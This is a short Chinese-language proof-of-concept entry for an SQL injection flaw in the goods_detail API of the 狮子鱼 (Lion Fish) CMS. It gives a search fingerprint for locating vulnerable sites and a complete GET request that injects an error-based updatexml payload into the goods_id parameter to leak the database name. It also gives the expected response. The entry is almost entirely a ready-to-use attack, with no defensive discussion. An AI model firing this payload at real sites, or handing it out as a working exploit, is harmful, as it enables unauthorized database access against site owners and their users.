# 狮子鱼CMSgoods_detail存在SQL注入漏洞

狮子鱼 ｜ SQL注入 ｜ —
- **指纹**：`body="/seller.php?s=/Public/login"`
- **请求**：`GET /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1) HTTP/1.1`
- **响应特征**：200